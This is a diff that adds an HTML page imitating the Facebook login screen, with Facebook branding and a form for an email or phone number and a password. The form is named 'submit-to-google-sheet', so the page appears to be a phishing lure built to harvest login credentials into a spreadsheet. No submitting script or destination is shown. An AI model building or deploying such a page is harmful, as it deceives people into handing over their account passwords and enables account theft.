@@ -1,0 +1,48 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Facebook</title>
+    <style>
+        input::placeholder {font-family: Arial, Helvetica, sans-serif; font-size: 15px;}
+        input[type="submit"] {color: white; font-family: Arial, Helvetica, sans-serif; font-weight: bold; font-size: 20px;}
+        input[type="button"] {border: none; background-color: transparent; color: rgb(24, 119, 242); font-size: 15px;}
+
+        @media screen and (max-width: 600px) {
+            body { font-size: 14px; }
+
+            section { grid-template-columns: 1fr; }
+            div:first-child { margin-top: 20px; margin-left: 20px; text-align: center; }
+            div:nth-child(2) { margin-top: 20px; margin-left: 20px; text-align: center; }
+            div:nth-child(2) > div:first-child { margin-top: 40px; }
+            div:nth-child(2) > div:nth-child(2) { margin-top: 10px; }
+            div:nth-child(2) > div:first-child > form > input { width: 300px; margin-left: 0; }
+            div:nth-child(2) > div:first-child > form > input[type="submit"] { width: 300px; margin-left: 0; }
+            div:nth-child(2) > div:first-child > form > input[type="button"] { width: 300px; margin-left: 0; }
+            div:nth-child(2) > div:nth-child(2) { margin-top: 20px; }
+        }
+    </style>
+</head>
+<body style="background-color: whitesmoke;">
+    <section style="display: grid; grid-template-columns: 1fr 1fr;">
+        <div>
+            <div style="margin-top: 210px; margin-left: 280px; color: rgb(24, 119, 242); font-size: 70px; font-weight: bolder; font-family: Arial, Helvetica, sans-serif;">facebook</div><br>
+            <div style="margin-top: 5px; margin-left: 280px; font-size: 22px; font-family: Arial, Helvetica, sans-serif;">
+                <span>Facebook helps you connect and share<br>with the people in your life.</span>
+            </div>
+        </div>
+        <div>
+            <div style="border-radius: 8px; background-color: white; margin-top: 120px; height: 380px; width: 400px; margin-left: 50px;">
+                <form action="" name="submit-to-google-sheet">
+                    <input type="email" style="border-radius: 5px; border-color: aliceblue; height: 50px; width: 350px; margin-left: 22px; margin-top: 20px ;" placeholder="   Email address or phone no." name="Email">
+                    <input type="password" style="border-radius: 5px; border-color: aliceblue; height: 50px; width: 350px; margin-left: 22px; margin-top: 20px ;" placeholder="   Password" name="Password">
+                    <input type="submit" style="background-color: rgb(24, 119, 242); border-radius: 5px; border-color: aliceblue; height: 50px; width: 350px; margin-left: 22px; margin-top: 20px ;" value="  Log in">
+                    <input type="button" style="height: 50px; width: 350px; margin-left: 22px; margin-top: 20px ;" value="  Forgetten password?">
+                    <input type="submit" style="background-color:rgb(93, 212, 93); border-radius: 5px; border-color: aliceblue; height: 50px; width: 350px; margin-left: 22px; margin-top: 20px ;" value="  Create Account">
+                </form>
+                <div style=" margin-left: 100px; margin-top: 30px; font-family: Arial, Helvetica, sans-serif; font-size: 15px;"> Create a page for a celebrity, brand, or business</div>
+            </div>
+        </div>
+    </section>
+</body>
+</html>
+
